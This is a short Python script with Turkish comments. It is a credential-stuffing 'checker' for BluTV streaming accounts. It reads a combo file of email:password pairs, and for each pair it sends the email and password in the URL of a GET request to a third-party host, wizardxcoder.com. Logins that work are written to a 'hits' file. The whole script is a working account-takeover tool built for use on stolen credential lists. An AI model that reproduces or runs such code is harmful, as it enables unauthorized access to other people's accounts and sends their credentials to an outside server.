import requests
import time

# Kullanıcıdan combo dosyasının yolu
combo_file = input(" ~ Combo dosyasını girin: ")

# Sonuçları kaydedeceğimiz dosya
output_file = "blutv_hits.txt"


def check_login(email, password):
    """Email ve şifre ile giriş işlemini kontrol et."""
    url = f"https://wizardxcoder.com/blutv.php?email={email}&sifre={password}"

    try:
        # API çağrısını yap
        response = requests.get(url, timeout=5)

        # Durum kodu kontrolü
        if response.status_code != 200:
            print(f"HTTP Hatası ({response.status_code}): {url}")
            return False

        # Başarı kontrolü - yanıt içeriğini kontrol et
        if "success" in response.text.lower():
            return True
        else:
            return False

    except requests.Timeout:
        print(f"Zaman aşımı hatası: {url}")
        return False
    except requests.RequestException as e:
        print(f"Bağlantı hatası ({e}): {url}")
        return False


# Combo dosyasını oku ve giriş bilgilerini kontrol et
try:
    with open(combo_file, "r") as file, open(output_file, "a") as hit_file:
        for line in file:
            line = line.strip()

            # Geçerli bir formatta olup olmadığını kontrol et
            if ":" not in line:
                print(f"Geçersiz format: {line}")
                continue

            email, password = line.split(":")

            # Giriş kontrolü yap
            print(f"Giriş testi: {email}:{password}")
            if check_login(email, password):
                hit_file.write(f"{email}:{password}\n")
                print(f"Başarılı ✅: {email}:{password}")
            else:
                print(f"Başarısız ❌: {email}:{password}")

            # İsteği hızlandırmak için kısa bir bekleme
            time.sleep(1)

except FileNotFoundError:
    print("Combo dosyası bulunamadı.")
except Exception as e:
    print(f"Bir hata oluştu: {e}")
